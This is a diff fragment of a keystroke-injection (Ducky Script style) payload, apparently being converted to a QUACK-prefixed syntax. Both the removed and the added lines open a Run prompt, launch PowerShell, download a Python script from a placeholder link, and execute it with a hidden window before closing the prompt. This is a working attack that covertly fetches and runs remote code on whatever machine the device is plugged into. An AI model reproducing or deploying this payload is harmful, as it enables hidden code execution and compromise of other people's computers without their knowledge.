@@ -13,19 +13,19 @@
 *     - Internet Connection
 
 
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell
-ENTER
-DELAY 500
+QUACK DELAY 1000
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell
+QUACK ENTER
+QUACK DELAY 500
 
 * REQUIRED - Set your Python script link
-STRING Invoke-WebRequest -Uri "SCRIPT-PY-LINK" -OutFile "script.py"
-ENTER
-DELAY 500
+QUACK STRING Invoke-WebRequest -Uri "SCRIPT-PY-LINK" -OutFile "script.py"
+QUACK ENTER
+QUACK DELAY 500
 
-STRING Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
-ENTER
-DELAY 1000
-ALT F4
+QUACK STRING Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
+QUACK ENTER
+QUACK DELAY 1000
+QUACK ALT F4
